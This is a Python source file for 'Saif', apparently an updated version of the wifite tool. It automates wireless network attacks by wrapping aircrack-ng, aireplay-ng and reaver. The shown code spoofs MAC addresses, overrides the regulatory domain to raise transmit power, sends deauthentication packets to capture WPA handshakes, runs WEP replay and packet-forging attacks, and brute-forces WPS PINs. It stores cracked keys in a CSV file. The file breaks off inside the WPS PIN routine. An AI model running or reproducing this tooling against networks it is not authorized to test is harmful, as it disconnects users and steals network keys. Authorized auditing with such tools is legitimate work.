#!/usr/bin/env python3

# -*- coding: utf-8 -*-

"""
    Saif - Modern Wireless Security Auditor
    Based on the original wifite tool
    
    Author: Customized version with modern updates
    Original authors: derv82, bwall, drone
    
    Licensed under GNU GPL v2
"""

import csv
import os
import time
import random
import errno
import sys
import re
import argparse
import abc
import signal
import subprocess
import tempfile
import shutil
from pathlib import Path
from typing import List, Tuple, Optional, Dict, Any
from datetime import datetime

# Console colors with better cross-platform support
class Colors:
    """ANSI color codes with Windows support detection"""
    if os.name == 'nt':
        import ctypes
        # Enable ANSI support on Windows 10+
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
    # Original color mappings
    W = END
    R = FAIL
    G = GREEN
    O = WARNING
    B = BLUE
    P = HEADER
    C = CYAN
    GR = '\033[90m'  # Gray

# Suppress output from subprocesses
DEVNULL = open(os.devnull, 'w')
ERROR_LOG = open(os.devnull, 'w')
OUTPUT_LOG = open(os.devnull, 'w')


class CapFile:
    """Holds data about an access point's capture file"""
    def __init__(self, filename: str, ssid: str, bssid: str):
        self.filename = filename
        self.ssid = ssid
        self.bssid = bssid


class Target:
    """Holds data for a target access point"""
    def __init__(self, bssid: str, power: int, data: str, channel: str, 
                 encryption: str, ssid: str):
        self.bssid = bssid
        self.power = power
        self.data = data
        self.channel = channel
        self.encryption = encryption
        self.ssid = ssid
        self.wps = False
        self.wps_locked = False
        self.key = ''
        self.clients: List[Client] = []


class Client:
    """Holds data for a connected client"""
    def __init__(self, bssid: str, station: str, power: str):
        self.bssid = bssid
        self.station = station
        self.power = power


class Configuration:
    """Modern configuration management"""
    
    def __init__(self):
        self.REVISION = "2024.1"
        self.VERSION = f"Saif v{self.REVISION}"
        
        # Paths
        self.TEMP_DIR = tempfile.mkdtemp(prefix='saif_')
        self.HANDSHAKE_DIR = 'handshakes'
        self.CRACKED_FILE = 'cracked.csv'
        
        # Ensure directories exist
        os.makedirs(self.HANDSHAKE_DIR, exist_ok=True)
        
        # Interface settings
        self.interface = ''
        self.monitor_interface = ''
        self.target_channel = 0
        self.target_essid = ''
        self.target_bssid = ''
        self.show_mac_in_scan = False
        self.min_power = 0
        self.tx_power = 0
        self.mac_spoof = False
        self.original_mac = ('', '')
        self.current_mac = ''
        
        # Attack settings
        self.attack_all = False
        self.verbose = True
        self.send_deauths = True
        self.show_cracked = False
        
        # WPA/WPA2 settings
        self.wpa_enabled = True
        self.wpa_timeout = 500
        self.wpa_deauth_timeout = 10
        self.wpa_deauth_count = 2
        self.wpa_dictionary = self._find_wordlist()
        self.wpa_crack = False
        self.wpa_handshakes: List[CapFile] = []
        self.wpa_findings: List[str] = []
        
        # WEP settings
        self.wep_enabled = True
        self.wep_pps = 600
        self.wep_timeout = 600
        self.wep_attacks = {
            'arpreplay': True,
            'chopchop': True,
            'fragment': True,
            'caffe_latte': True,
            'p0841': True,
            'hirte': True
        }
        self.wep_crack_at = 10000
        self.wep_ignore_fakeauth = True
        self.wep_findings: List[str] = []
        
        # WPS settings
        self.wps_enabled = True
        self.wps_pixie = False
        self.wps_timeout = 660
        self.wps_ratio = 0.01
        self.wps_max_retries = 0
        self.wps_findings: List[str] = []
        
        # Load cracked targets
        self.cracked_targets = self._load_cracked()
        
    def _find_wordlist(self) -> str:
        """Find a suitable wordlist on the system"""
        common_paths = [
            '/usr/share/wordlists/rockyou.txt',
            '/usr/share/wordlists/rockyou.txt.gz',
            '/usr/share/wordlists/fasttrack.txt',
            '/usr/share/john/password.lst',
            '/usr/share/wordlists/fern-wifi/common.txt',
            '/usr/share/fuzzdb/wordlists-user-passwd/passwds/phpbb.txt'
        ]
        
        for path in common_paths:
            if os.path.exists(path):
                return path
        return ''
    
    def _load_cracked(self) -> List[Target]:
        """Load previously cracked targets"""
        targets = []
        if os.path.exists(self.CRACKED_FILE):
            try:
                with open(self.CRACKED_FILE, 'r', newline='', encoding='utf-8') as f:
                    reader = csv.reader(f)
                    for row in reader:
                        if len(row) >= 5:
                            t = Target(row[0], 0, 0, 0, row[1], row[2])
                            t.key = row[3]
                            t.wps = row[4] == 'True'
                            targets.append(t)
            except Exception as e:
                print(f"{Colors.O} [!] Error loading cracked file: {e}{Colors.END}")
        return targets
    
    def save_cracked(self, target: Target):
        """Save cracked target to file"""
        self.cracked_targets.append(target)
        try:
            with open(self.CRACKED_FILE, 'a', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow([
                    target.bssid, target.encryption, 
                    target.ssid, target.key, target.wps
                ])
        except Exception as e:
            print(f"{Colors.O} [!] Error saving cracked target: {e}{Colors.END}")
    
    def cleanup(self):
        """Clean up temporary files"""
        if os.path.exists(self.TEMP_DIR):
            shutil.rmtree(self.TEMP_DIR, ignore_errors=True)


def banner():
    """Display the Saif ASCII banner"""
    print(f"""
{Colors.GREEN}    ███████╗ █████╗ ██╗███████╗
{Colors.GREEN}    ██╔════╝██╔══██╗██║██╔════╝
{Colors.GREEN}    ███████╗███████║██║█████╗  
{Colors.GREEN}    ╚════██║██╔══██║██║██╔══╝  
{Colors.GREEN}    ███████║██║  ██║██║██║     
{Colors.GREEN}    ╚══════╝╚═╝  ╚═╝╚═╝╚═╝     
{Colors.CYAN}                                 
{Colors.CYAN}    Automated Wireless Auditor
{Colors.WARNING}    Version {Configuration().VERSION}
{Colors.GREEN}    Modern Security Testing Tool{Colors.END}
    """)


class InterfaceManager:
    """Modern wireless interface management"""
    
    def __init__(self, config: Configuration):
        self.config = config
        self.monitor_mode = False
        
    def get_interfaces(self) -> Tuple[List[str], List[str]]:
        """Get list of wireless interfaces"""
        monitors = []
        adapters = []
        
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            current_iface = ''
            
            for line in result.stdout.split('\n'):
                if line and not line.startswith(' '):
                    current_iface = line.split()[0]
                    adapters.append(current_iface)
                if 'Mode:Monitor' in line:
                    monitors.append(current_iface)
        except Exception:
            pass
            
        return monitors, adapters
    
    def enable_monitor_mode(self, iface: str) -> Optional[str]:
        """Enable monitor mode on interface"""
        print(f"{Colors.GREEN} [+] {Colors.END}Enabling monitor mode on {Colors.GREEN}{iface}{Colors.END}...", end='')
        sys.stdout.flush()
        
        try:
            # Spoof MAC if requested
            if self.config.mac_spoof:
                self._spoof_mac(iface)
            
            # Enable monitor mode
            subprocess.run(['airmon-ng', 'start', iface], 
                          capture_output=True, text=True)
            
            # Get new interface name
            monitors, _ = self.get_interfaces()
            if monitors:
                monitor_iface = monitors[0]
                self.config.monitor_interface = monitor_iface
                self.monitor_mode = True
                print(" done")
                
                # Set TX power if specified
                if self.config.tx_power > 0:
                    self._set_tx_power(monitor_iface)
                    
                return monitor_iface
        except Exception as e:
            print(f"{Colors.R} failed: {e}{Colors.END}")
        
        return None
    
    def disable_monitor_mode(self):
        """Disable monitor mode"""
        if self.config.monitor_interface:
            print(f"{Colors.GREEN} [+] {Colors.END}Disabling monitor mode...", end='')
            subprocess.run(['airmon-ng', 'stop', self.config.monitor_interface],
                          capture_output=True)
            print(" done")
            
        # Restore original MAC
        if self.config.original_mac[0] and self.config.original_mac[1]:
            self._restore_mac()
    
    def _spoof_mac(self, iface: str):
        """Spoof MAC address"""
        try:
            # Get current MAC
            result = subprocess.run(['ifconfig', iface], 
                                  capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'ether' in line:
                    old_mac = line.split()[1]
                    self.config.original_mac = (iface, old_mac)
                    break
            
            # Generate random MAC
            new_mac = self._random_mac()
            
            # Change MAC
            subprocess.run(['ifconfig', iface, 'down'], check=True)
            subprocess.run(['ifconfig', iface, 'hw', 'ether', new_mac], check=True)
            subprocess.run(['ifconfig', iface, 'up'], check=True)
            
            print(f"\n{Colors.GREEN} [+] {Colors.END}MAC changed to {Colors.O}{new_mac}{Colors.END}")
            
        except Exception as e:
            print(f"{Colors.O} [!] MAC spoofing failed: {e}{Colors.END}")
    
    def _restore_mac(self):
        """Restore original MAC"""
        iface, mac = self.config.original_mac
        try:
            subprocess.run(['ifconfig', iface, 'down'], check=True)
            subprocess.run(['ifconfig', iface, 'hw', 'ether', mac], check=True)
            subprocess.run(['ifconfig', iface, 'up'], check=True)
            print(f"{Colors.GREEN} [+] {Colors.END}MAC restored to {Colors.GREEN}{mac}{Colors.END}")
        except Exception:
            pass
    
    def _random_mac(self) -> str:
        """Generate random MAC address"""
        random.seed()
        mac = [random.randint(0x00, 0xff) for _ in range(6)]
        # Ensure unicast and locally administered
        mac[0] = (mac[0] & 0xfc) | 0x02
        return ':'.join(f'{b:02x}' for b in mac)
    
    def _set_tx_power(self, iface: str):
        """Set transmit power"""
        try:
            subprocess.run(['iw', 'reg', 'set', 'BO'], check=True)
            subprocess.run(['iwconfig', iface, 'txpower', str(self.config.tx_power)],
                          check=True)
            print(f"{Colors.GREEN} [+] {Colors.END}TX power set to {self.config.tx_power}")
        except Exception:
            pass


class Scanner:
    """Modern network scanner using airodump-ng"""
    
    def __init__(self, config: Configuration, iface_mgr: InterfaceManager):
        self.config = config
        self.iface_mgr = iface_mgr
        
    def scan(self, channel: int = 0) -> Tuple[List[Target], List[Client]]:
        """Scan for networks and clients"""
        prefix = os.path.join(self.config.TEMP_DIR, 'scan')
        csv_file = f"{prefix}-01.csv"
        cap_file = f"{prefix}-01.cap"
        
        # Build command
        cmd = [
            'airodump-ng',
            '-a',  # Only show associated clients
            '--write-interval', '1',
            '-w', prefix,
            '--output-format', 'csv',
            self.config.monitor_interface
        ]
        
        if channel != 0:
            cmd.extend(['-c', str(channel)])
        
        print(f"{Colors.GREEN} [+] {Colors.END}Starting scan on {Colors.GREEN}{self.config.monitor_interface}{Colors.END}")
        print(f"{Colors.GREEN} [+] {Colors.END}Press Ctrl+C when ready")
        
        proc = subprocess.Popen(cmd, stdout=DEVNULL, stderr=DEVNULL)
        targets = []
        clients = []
        
        try:
            start_time = time.time()
            while True:
                time.sleep(1)
                
                if os.path.exists(csv_file):
                    targets, clients = self._parse_csv(csv_file)
                    
                    # Filter targets
                    targets = self._filter_targets(targets)
                    
                    # Display
                    self._display_scan(targets, clients, time.time() - start_time)
                    
                    # Auto-stop conditions
                    if self._should_stop(targets, time.time() - start_time):
                        break
                        
        except KeyboardInterrupt:
            print(f"\n{Colors.O} [!] Scan interrupted{Colors.END}")
            
        finally:
            self._cleanup_process(proc)
            self._cleanup_files(prefix)
            
        return self._select_targets(targets, clients)
    
    def _parse_csv(self, filename: str) -> Tuple[List[Target], List[Client]]:
        """Parse airodump CSV output"""
        targets = []
        clients = []
        
        if not os.path.exists(filename):
            return targets, clients
            
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                reader = csv.reader(line.replace('\0', '') for line in f)
                clients_section = False
                
                for row in reader:
                    if not row:
                        continue
                        
                    if not clients_section:
                        if row[0].strip() == 'Station MAC':
                            clients_section = True
                            continue
                            
                        if len(row) < 14 or row[0].strip() == 'BSSID':
                            continue
                            
                        # Parse AP
                        enc = row[5].strip()
                        if 'WPA' not in enc and 'WEP' not in enc:
                            continue
                            
                        try:
                            power = int(row[8].strip())
                            if power < 0:
                                power += 100
                                
                            ssid = row[13].strip()
                            ssid_len = int(row[12].strip())
                            ssid = ssid[:ssid_len]
                            
                            t = Target(
                                row[0].strip(),
                                power,
                                row[10].strip(),
                                row[3].strip(),
                                enc,
                                ssid
                            )
                            targets.append(t)
                        except (ValueError, IndexError):
                            continue
                            
                    else:
                        # Parse clients
                        if len(row) >= 6:
                            station = re.sub(r'[^a-zA-Z0-9:]', '', row[5].strip())
                            if station and station != 'notassociated':
                                c = Client(
                                    re.sub(r'[^a-zA-Z0-9:]', '', row[0].strip()),
                                    station,
                                    row[3].strip()
                                )
                                clients.append(c)
                                
        except Exception as e:
            print(f"{Colors.O} [!] Error parsing CSV: {e}{Colors.END}")
            
        return targets, clients
    
    def _filter_targets(self, targets: List[Target]) -> List[Target]:
        """Filter targets based on configuration"""
        filtered = []
        
        for t in targets:
            # Check encryption
            if 'WPA' in t.encryption and not self.config.wpa_enabled:
                continue
            if 'WEP' in t.encryption and not self.config.wep_enabled:
                continue
                
            # Check power
            if self.config.min_power > 0 and t.power < self.config.min_power:
                continue
                
            # Check if already cracked
            if not self.config.show_cracked:
                cracked = False
                for ct in self.config.cracked_targets:
                    if t.bssid == ct.bssid or t.ssid == ct.ssid:
                        cracked = True
                        break
                if cracked:
                    continue
                    
            filtered.append(t)
            
        return filtered
    
    def _display_scan(self, targets: List[Target], clients: List[Client], 
                     elapsed: float):
        """Display scan results"""
        os.system('clear' if os.name == 'posix' else 'cls')
        banner()
        
        print(f"{Colors.GREEN} [+] {Colors.END}Scanning for {elapsed:.0f} seconds\n")
        print(f"   {'NUM':<4} {'ESSID':<20} {'CH':<3} {'ENC':<5} "
              f"{'PWR':<5} {'WPS':<4} {'CLIENTS':<8}")
        print(f"   {'---':<4} {'--------------------':<20} {'--':<3} "
              f"{'----':<5} {'-----':<5} {'----':<4} {'-------':<8}")
        
        for i, t in enumerate(sorted(targets, key=lambda x: x.power, reverse=True), 1):
            # SSID
            if not t.ssid or '\x00' in t.ssid:
                ssid = f"{Colors.O}({t.bssid}){Colors.END}"
            else:
                ssid = f"{Colors.C}{t.ssid[:20]}{Colors.END}"
                
            # Power color
            if t.power >= 70:
                pwr_color = Colors.GREEN
            elif t.power >= 50:
                pwr_color = Colors.WARNING
            else:
                pwr_color = Colors.FAIL
                
            # Count clients
            client_count = sum(1 for c in clients if c.station == t.bssid)
            
            print(f"   {Colors.GREEN}{i:<4}{Colors.END} "
                  f"{ssid:<20} "
                  f"{Colors.GREEN}{t.channel:<3}{Colors.END} "
                  f"{t.encryption[:5]:<5} "
                  f"{pwr_color}{t.power:<5}{Colors.END} "
                  f"{Colors.GREEN if t.wps else Colors.FAIL}{'Yes' if t.wps else 'No':<4}{Colors.END} "
                  f"{Colors.GREEN}{client_count:<7}{Colors.END}")
    
    def _should_stop(self, targets: List[Target], elapsed: float) -> bool:
        """Check if scan should stop"""
        # Auto-target all after 15 seconds
        if self.config.attack_all and elapsed > 15:
            return True
            
        # Target specific ESSID/BSSID
        if self.config.target_essid:
            for t in targets:
                if t.ssid.lower() == self.config.target_essid.lower():
                    return True
                    
        if self.config.target_bssid:
            for t in targets:
                if t.bssid.lower() == self.config.target_bssid.lower():
                    return True
                    
        return False
    
    def _cleanup_process(self, proc):
        """Cleanup scan process"""
        try:
            proc.terminate()
            proc.wait(timeout=2)
        except:
            proc.kill()
    
    def _cleanup_files(self, prefix: str):
        """Cleanup scan files"""
        for ext in ['.csv', '.cap', '.kismet.csv', '.kismet.netxml']:
            try:
                os.remove(f"{prefix}-01{ext}")
            except:
                pass
    
    def _select_targets(self, targets: List[Target], clients: List[Client]) \
            -> Tuple[List[Target], List[Client]]:
        """Interactive target selection"""
        if not targets:
            print(f"{Colors.O} [!] No targets found{Colors.END}")
            return [], []
            
        # Auto-select if targeting specific
        if self.config.target_essid or self.config.target_bssid:
            selected = []
            for t in targets:
                if self.config.target_essid and t.ssid.lower() == self.config.target_essid.lower():
                    selected.append(t)
                elif self.config.target_bssid and t.bssid.lower() == self.config.target_bssid.lower():
                    selected.append(t)
            if selected:
                return selected, clients
                
        # Auto-select all
        if self.config.attack_all:
            return targets, clients
            
        # Interactive selection
        print(f"\n{Colors.GREEN} [+] {Colors.END}Select targets (e.g., 1,3-5,7 or 'all'): ", end='')
        choice = input().strip()
        
        if choice.lower() == 'all':
            return targets, clients
            
        selected = []
        for part in choice.split(','):
            part = part.strip()
            if '-' in part:
                try:
                    start, end = map(int, part.split('-'))
                    for i in range(start, min(end, len(targets)) + 1):
                        selected.append(targets[i-1])
                except:
                    pass
            elif part.isdigit():
                idx = int(part)
                if 1 <= idx <= len(targets):
                    selected.append(targets[idx-1])
                    
        return selected, clients


class WPAAttack:
    """Modern WPA/WPA2 handshake capture"""
    
    def __init__(self, config: Configuration, iface: str, target: Target, 
                 clients: List[Client]):
        self.config = config
        self.iface = iface
        self.target = target
        self.clients = clients
        
    def run(self) -> bool:
        """Capture WPA handshake"""
        print(f"\n{Colors.GREEN} [+] {Colors.END}Starting WPA handshake capture on "
              f"{Colors.GREEN}{self.target.ssid}{Colors.END}")
        
        # Generate filename
        safe_ssid = re.sub(r'[^a-zA-Z0-9]', '', self.target.ssid)
        safe_bssid = self.target.bssid.replace(':', '-')
        handshake_file = os.path.join(
            self.config.HANDSHAKE_DIR,
            f"{safe_ssid}_{safe_bssid}.cap"
        )
        
        # Check if exists
        if os.path.exists(handshake_file):
            print(f"{Colors.O} [!] Handshake already exists: {handshake_file}{Colors.END}")
            choice = input(f"{Colors.GREEN} [+] {Colors.END}Overwrite? (y/n): ").lower()
            if choice != 'y':
                return False
        
        prefix = os.path.join(self.config.TEMP_DIR, 'wpa')
        
        # Start airodump
        cmd = [
            'airodump-ng',
            '-w', prefix,
            '-c', self.target.channel,
            '--bssid', self.target.bssid,
            '--write-interval', '1',
            self.iface
        ]
        
        dump_proc = subprocess.Popen(cmd, stdout=DEVNULL, stderr=DEVNULL)
        
        captured = False
        start_time = time.time()
        deauth_time = 0
        client_idx = -1
        target_clients = self.clients.copy()
        
        try:
            while not captured and time.time() - start_time < self.config.wpa_timeout:
                time.sleep(1)
                elapsed = int(time.time() - start_time)
                
                # Send deauth packets
                if time.time() - deauth_time > self.config.wpa_deauth_timeout:
                    deauth_time = time.time()
                    client_idx += 1
                    
                    if client_idx >= len(target_clients):
                        client_idx = -1
                        
                    if client_idx == -1:
                        print(f"\r{Colors.GREEN} [{elapsed}s] {Colors.END}Sending deauth to broadcast...", end='')
                        self._send_deauth(None)
                    else:
                        print(f"\r{Colors.GREEN} [{elapsed}s] {Colors.END}Sending deauth to "
                              f"{target_clients[client_idx].station}...", end='')
                        self._send_deauth(target_clients[client_idx].station)
                        
                    sys.stdout.flush()
                
                # Check for handshake
                cap_file = f"{prefix}-01.cap"
                if os.path.exists(cap_file):
                    if self._has_handshake(cap_file):
                        captured = True
                        shutil.copy(cap_file, handshake_file)
                        print(f"\n{Colors.GREEN} [+] {Colors.END}Handshake captured! "
                              f"Saved to {handshake_file}")
                        
                        # Add to crack list
                        self.config.wpa_handshakes.append(
                            CapFile(handshake_file, self.target.ssid, self.target.bssid)
                        )
                        break
                        
        except KeyboardInterrupt:
            print(f"\n{Colors.O} [!] Capture interrupted{Colors.END}")
            
        finally:
            dump_proc.terminate()
            self._cleanup(prefix)
            
        return captured
    
    def _send_deauth(self, client_mac: Optional[str]):
        """Send deauth packets"""
        cmd = [
            'aireplay-ng',
            '--deauth', str(self.config.wpa_deauth_count),
            '-a', self.target.bssid,
            self.iface
        ]
        
        if client_mac:
            cmd.extend(['-c', client_mac])
            
        subprocess.run(cmd, stdout=DEVNULL, stderr=DEVNULL)
    
    def _has_handshake(self, cap_file: str) -> bool:
        """Check if handshake exists using multiple tools"""
        # Try aircrack-ng first
        cmd = f'echo "" | aircrack-ng -a 2 -w - -b {self.target.bssid} {cap_file}'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        if 'Passphrase not in dictionary' in result.stdout:
            return True
            
        # Try tshark for verification
        if shutil.which('tshark'):
            cmd = [
                'tshark', '-r', cap_file,
                '-Y', 'eapol',
                '-2', '-n'
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            if 'Key (msg' in result.stdout:
                return True
                
        return False
    
    def _cleanup(self, prefix: str):
        """Clean up temporary files"""
        for ext in ['.cap', '.csv', '.kismet.csv', '.kismet.netxml']:
            try:
                os.remove(f"{prefix}-01{ext}")
            except:
                pass


class WEPAttack:
    """Modern WEP cracking attacks"""
    
    def __init__(self, config: Configuration, iface: str, target: Target,
                 clients: List[Client]):
        self.config = config
        self.iface = iface
        self.target = target
        self.clients = clients
        
    def run(self) -> bool:
        """Execute WEP attacks"""
        print(f"\n{Colors.GREEN} [+] {Colors.END}Starting WEP attack on "
              f"{Colors.GREEN}{self.target.ssid}{Colors.END}")
        
        # Try fake authentication first
        if not self._fake_auth():
            if not self.config.wep_ignore_fakeauth:
                print(f"{Colors.R} [!] Fake authentication failed{Colors.END}")
                return False
        
        prefix = os.path.join(self.config.TEMP_DIR, 'wep')
        key_file = os.path.join(self.config.TEMP_DIR, 'wepkey.txt')
        
        # Start capture
        dump_proc = self._start_capture(prefix)
        
        cracked = False
        total_ivs = 0
        last_ivs = 0
        cracking = False
        crack_proc = None
        
        try:
            for attack in ['arpreplay', 'chopchop', 'fragment', 'caffe_latte']:
                if not self.config.wep_attacks.get(attack, True):
                    continue
                    
                print(f"{Colors.GREEN} [+] {Colors.END}Trying {attack} attack...")
                
                # Start attack
                attack_proc = self._run_attack(attack, prefix)
                
                attack_start = time.time()
                while time.time() - attack_start < self.config.wep_timeout:
                    time.sleep(2)
                    
                    # Check IV count
                    ivs = self._get_iv_count(prefix)
                    if ivs > 0:
                        print(f"\r{Colors.GREEN} [{int(time.time()-attack_start)}s] "
                              f"IVs: {total_ivs + ivs} (+{ivs - last_ivs}/s){Colors.END}", end='')
                        
                        if total_ivs + ivs >= self.config.wep_crack_at and not cracking:
                            print(f"\n{Colors.GREEN} [+] {Colors.END}Starting cracker...")
                            crack_proc = self._start_cracker(prefix, key_file)
                            cracking = True
                            
                        last_ivs = ivs
                        
                    # Check if cracked
                    if os.path.exists(key_file):
                        with open(key_file, 'r') as f:
                            key = f.read().strip()
                        if key:
                            print(f"\n\n{Colors.GREEN} [+] {Colors.END}WEP Key found: "
                                  f"{Colors.C}{key}{Colors.END}")
                            self._save_result(key)
                            cracked = True
                            break
                            
                    # Check if attack finished
                    if attack_proc.poll() is not None:
                        if attack == 'chopchop' or attack == 'fragment':
                            # Forge packet
                            if self._forge_packet(prefix):
                                print(f"\n{Colors.GREEN} [+] {Colors.END}Forged packet, replaying...")
                                attack_proc = self._replay_forged(prefix)
                            else:
                                break
                        else:
                            break
                            
                if cracked:
                    break
                    
                if attack_proc:
                    attack_proc.terminate()
                    
        except KeyboardInterrupt:
            print(f"\n{Colors.O} [!] Attack interrupted{Colors.END}")
            
        finally:
            dump_proc.terminate()
            if crack_proc:
                crack_proc.terminate()
            self._cleanup(prefix, key_file)
            
        return cracked
    
    def _fake_auth(self) -> bool:
        """Attempt fake authentication"""
        for attempt in range(3):
            print(f"{Colors.GREEN} [+] {Colors.END}Fake auth attempt {attempt+1}/3...", end='')
            sys.stdout.flush()
            
            cmd = [
                'aireplay-ng',
                '-1', '0',
                '-a', self.target.bssid,
                self.iface
            ]
            
            if self.target.ssid:
                cmd.extend(['-e', self.target.ssid])
                
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if 'Association successful' in result.stdout:
                print(f"{Colors.GREEN} success{Colors.END}")
                return True
            else:
                print(f"{Colors.R} failed{Colors.END}")
                time.sleep(1)
                
        return False
    
    def _start_capture(self, prefix: str):
        """Start packet capture"""
        cmd = [
            'airodump-ng',
            '-w', prefix,
            '-c', self.target.channel,
            '--bssid', self.target.bssid,
            '--write-interval', '1',
            self.iface
        ]
        return subprocess.Popen(cmd, stdout=DEVNULL, stderr=DEVNULL)
    
    def _run_attack(self, attack: str, prefix: str):
        """Run specific WEP attack"""
        cmd = ['aireplay-ng', '--ignore-negative-one']
        
        if attack == 'arpreplay':
            cmd.extend(['--arpreplay', '-b', self.target.bssid])
        elif attack == 'chopchop':
            cmd.extend(['--chopchop', '-b', self.target.bssid, '-F'])
        elif attack == 'fragment':
            cmd.extend(['--fragment', '-b', self.target.bssid, '-F'])
        elif attack == 'caffe_latte':
            cmd.extend(['--caffe-latte', '-b', self.target.bssid])
            
        cmd.extend(['-x', str(self.config.wep_pps), self.iface])
        
        return subprocess.Popen(cmd, stdout=DEVNULL, stderr=DEVNULL)
    
    def _get_iv_count(self, prefix: str) -> int:
        """Get current IV count from capture"""
        csv_file = f"{prefix}-01.csv"
        if not os.path.exists(csv_file):
            return 0
            
        try:
            with open(csv_file, 'r') as f:
                for line in f:
                    if line.startswith('BSSID'):
                        continue
                    parts = line.split(',')
                    if len(parts) > 10 and parts[0].strip() == self.target.bssid:
                        return int(parts[10].strip())
        except:
            pass
        return 0
    
    def _forge_packet(self, prefix: str) -> bool:
        """Forge ARP packet from keystream"""
        # Find XOR file
        xor_file = None
        for f in os.listdir(self.config.TEMP_DIR):
            if f.endswith('.xor'):
                xor_file = os.path.join(self.config.TEMP_DIR, f)
                break
                
        if not xor_file:
            return False
            
        # Forge packet
        cmd = [
            'packetforge-ng',
            '-0',
            '-a', self.target.bssid,
            '-h', self.config.current_mac,
            '-k', '255.255.255.255',
            '-l', '255.255.255.255',
            '-y', xor_file,
            '-w', os.path.join(self.config.TEMP_DIR, 'arp.cap'),
            self.iface
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        return 'Wrote packet' in result.stdout
    
    def _replay_forged(self, prefix: str):
        """Replay forged packet"""
        cmd = [
            'aireplay-ng',
            '--arpreplay',
            '-b', self.target.bssid,
            '-r', os.path.join(self.config.TEMP_DIR, 'arp.cap'),
            '-F',
            self.iface
        ]
        return subprocess.Popen(cmd, stdout=DEVNULL, stderr=DEVNULL)
    
    def _start_cracker(self, prefix: str, key_file: str):
        """Start aircrack-ng"""
        cmd = [
            'aircrack-ng',
            '-a', '1',
            '-l', key_file
        ]
        
        # Add all capture files
        for f in os.listdir(self.config.TEMP_DIR):
            if f.startswith('wep-') and f.endswith('.cap'):
                cmd.append(os.path.join(self.config.TEMP_DIR, f))
                
        return subprocess.Popen(cmd, stdout=DEVNULL, stderr=DEVNULL)
    
    def _save_result(self, key: str):
        """Save cracked WEP key"""
        self.target.key = key
        self.config.save_cracked(self.target)
        self.config.wep_findings.append(
            f"Cracked {self.target.ssid} ({self.target.bssid}): {key}"
        )
    
    def _cleanup(self, prefix: str, key_file: str):
        """Clean up temporary files"""
        for ext in ['.cap', '.csv', '.kismet.csv', '.kismet.netxml']:
            try:
                os.remove(f"{prefix}-01{ext}")
            except:
                pass
        try:
            os.remove(key_file)
        except:
            pass
        for f in os.listdir('.'):
            if f.startswith('replay_') and f.endswith('.cap'):
                try:
                    os.remove(f)
                except:
                    pass


class WPSAttack:
    """Modern WPS PIN attacks"""
    
    def __init__(self, config: Configuration, iface: str, target: Target):
        self.config = config
        self.iface = iface
        self.target = target
        
    def run(self) -> bool:
        """Execute WPS attack"""
        print(f"\n{Colors.GREEN} [+] {Colors.END}Starting WPS attack on "
              f"{Colors.GREEN}{self.target.ssid}{Colors.END}")
        
        # Check if pixie-dust is available and try it first
        if self._has_pixie_support():
            print(f"{Colors.GREEN} [+] {Colors.END}Trying Pixie-Dust attack...")
            if self._pixie_attack():
                return True
                
            if self.config.wps_pixie:
                return False
                
        # Try PIN attack
        print(f"{Colors.GREEN} [+] {Colors.END}Trying PIN brute-force...")
        return self._pin_attack()
    
    def _has_pixie_support(self) -> bool:
        """Check if reaver supports pixie-dust"""
        try:
            result = subprocess.run(['reaver', '-h'], 
                                   capture_output=True, text=True)
            return '--pixie-dust' in result.stderr
        except:
            return False
    
    def _pixie_attack(self) -> bool:
        """Execute pixie-dust attack"""
        output_file = os.path.join(self.config.TEMP_DIR, 'pixie.out')
        
        cmd = [
            'reaver',
            '-i', self.iface,
            '-b', self.target.bssid,
            '-c', self.target.channel,
            '-K', '1',
            '-vv'
        ]
        
        with open(output_file, 'w') as f:
            proc = subprocess.Popen(cmd, stdout=f, stderr=subprocess.STDOUT)
            
        start_time = time.time()
        pin = ''
        key = ''
        
        try:
            while proc.poll() is None:
                time.sleep(2)
                print(f"\r{Colors.GREEN} [{int(time.time()-start_time)}s] "
                      f"Pixie attack in progress...{Colors.END}", end='')
                sys.stdout.flush()
                
            # Check results
            if os.path.exists(output_file):
                with open(output_file, 'r') as f:
                    content = f.read()
                    
                # Parse for PIN and PSK
                pin_match = re.search(r"WPS PIN: '(\d+)'", content)
                if pin_match:
                    pin = pin_match.group(1)
                    
                psk_match = re.search(r"WPA PSK: '(.+?)'", content)
                if psk_match:
                    key = psk_match.group(1)
                    
                if not psk_match:
                    psk_match = re.search(r"WPA PSK:  (.+)", content)
                    if psk_match:
                        key = psk_match.group(1)
                        
        except KeyboardInterrupt:
            proc.terminate()
            
        if pin and key:
            print(f"\n\n{Colors.GREEN} [+] {Colors.END}WPS PIN found: {Colors.C}{pin}{Colors.END}")
            print(f"{Colors.GREEN} [+] {Colors.END}WPA Key found: {Colors.C}{key}{Colors.END}")
            self._save_result(pin, key)
            return True
            
        return False
    
    def _pin_attack(self) -> bool:
        """Execute PIN brute-force attack"""
        output_file = os.path.join(self.config.TEMP_DIR, 'reaver.out')
        
        cmd = [
            'reaver',
            '-i', self.iface,
            '-b', self.target.bssid,
            '-c', self.target.channel,
            '-o', output_file,
            '-vv'
        ]
        
        proc = subprocess.Popen(cmd, stdout=DEVNULL, stderr=DEVNULL)
        
        start_time = time.time()
        last_success = start_time
        tries = 0
        total = 0
        last_pin = ''
        retries = 0
        
        try:
            while proc.poll() is None:
                time.sleep(5)
                elapsed = int(time.time() - start_time)
                
                if os.path.exists(output_file):
                    with open(output_file, 'r') as f:
                        content = f.read()
                        
                    # Parse progress
                    percent_match = re.search(r'(\d+\.\d+)%', content)
                    if percent_match:
                        percent = percent_match.group(1)
                        
                    # Check for PIN/PSK
                    pin_match = re.search(r"WPS PIN: '(\d+)'", content)
                    if pin_match:
                        pin = pin_match.group(1)
                        
                    psk_match = re.search(r"WPA PSK: '(.+?)'", content)
                    if psk_match:
                        key = psk_match.group(1)
                        
                    if pin and key:
